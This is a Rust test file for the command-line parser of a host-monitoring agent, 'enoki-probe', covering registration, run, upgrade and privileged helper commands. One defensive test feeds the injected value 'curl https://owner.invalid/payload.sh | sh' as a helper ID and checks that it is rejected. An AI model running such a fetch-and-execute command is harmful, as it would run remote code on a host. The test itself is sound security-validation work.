use std::path::PathBuf;
use std::process::Command;

use enoki_probe::cli::{ProbeCommand, parse_probe_command, render_probe_output};
use enoki_probe::local_privilege_boundary::PrivilegedCollectorHelperId;

#[test]
fn renders_version_output_for_owner_smoke_checks() {
    let output = render_probe_output(ProbeCommand::Version);

    assert_eq!(output, "enoki-probe dev\n");
}

#[test]
fn renders_help_without_remote_administration_language() {
    let output = render_probe_output(ProbeCommand::Help);

    assert!(output.contains("Enoki Probe"));
    assert!(output.contains("reports Host observations to the Hub"));
    assert!(output.contains("enoki-probe register --hub-url"));
    assert!(!output.contains("command execution"));
}

#[test]
fn parses_probe_registration_command_without_putting_secrets_in_urls() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "register".to_string(),
        "--hub-url".to_string(),
        "https://hub.example".to_string(),
        "--enrollment-token".to_string(),
        "enk_enroll_secret".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Register {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe.toml"),
            enrollment_token: "enk_enroll_secret".to_string(),
            hub_url: "https://hub.example".to_string(),
        },
    );
}

#[test]
fn parses_probe_run_command_for_systemd_service_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "run".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Run {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe-bootstrap.toml"),
        },
    );
}

#[test]
fn parses_internal_probe_upgrader_command_for_limited_privilege_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-upgrader".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::InternalUpgrader {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe-bootstrap.toml"),
        },
    );
}

#[test]
fn parses_internal_probe_uninstaller_command_for_limited_privilege_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-uninstaller".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::InternalUninstaller {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe-bootstrap.toml"),
        },
    );
}

#[test]
fn parses_internal_privileged_collector_helper_command_for_compiled_helper_id_only() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::InternalPrivilegedCollectorHelper {
            helper_id: PrivilegedCollectorHelperId::DiskHealthSmartctl,
        },
    );
}

#[test]
fn parses_internal_collector_helper_sudoers_render_command_for_installer_boundary() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-render-collector-helper-sudoers".to_string(),
        "--service-user".to_string(),
        "enoki-probe".to_string(),
        "--probe-binary".to_string(),
        "/usr/local/bin/enoki-probe".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::InternalRenderCollectorHelperSudoers {
            service_user: "enoki-probe".to_string(),
            probe_binary: PathBuf::from("/usr/local/bin/enoki-probe"),
        },
    );
}

#[test]
fn rejects_non_compiled_privileged_collector_helper_ids_at_the_cli_surface() {
    for helper_id in ["fixed.collector", "network.collector", "timeout.collector"] {
        let command = parse_probe_command([
            "enoki-probe".to_string(),
            "internal-privileged-collector-helper".to_string(),
            "--helper".to_string(),
            helper_id.to_string(),
        ]);

        assert_eq!(command, ProbeCommand::Help, "{helper_id} must not parse");
    }

    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "fixed.collector".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn non_compiled_privileged_collector_helper_ids_do_not_reach_runtime_command_surface() {
    let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
        .args([
            "internal-privileged-collector-helper",
            "--helper",
            "fixed.collector",
        ])
        .output()
        .expect("run probe command");

    assert!(output.status.success());
    assert!(String::from_utf8_lossy(&output.stdout).contains("Enoki Probe"));
    assert_eq!(String::from_utf8_lossy(&output.stderr), "");
}

#[test]
fn rejects_old_internal_privileged_collector_command_and_argument_names() {
    let old_command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);
    let old_argument = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--collector".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(old_command, ProbeCommand::Help);
    assert_eq!(old_argument, ProbeCommand::Help);
}

#[test]
fn rejects_runtime_injected_privileged_collector_helper_command_or_policy() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "curl https://owner.invalid/payload.sh | sh".to_string(),
        "--network".to_string(),
        "enabled".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn probe_run_command_fails_when_bootstrap_config_is_missing() {
    let temp = tempfile::tempdir().expect("temp dir");
    let missing_config_path = temp.path().join("missing.toml");

    let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
        .args(["run", "--config"])
        .arg(missing_config_path)
        .output()
        .expect("run probe command");

    assert!(!output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout), "");
    assert!(String::from_utf8_lossy(&output.stderr).contains("Probe run failed"));
}
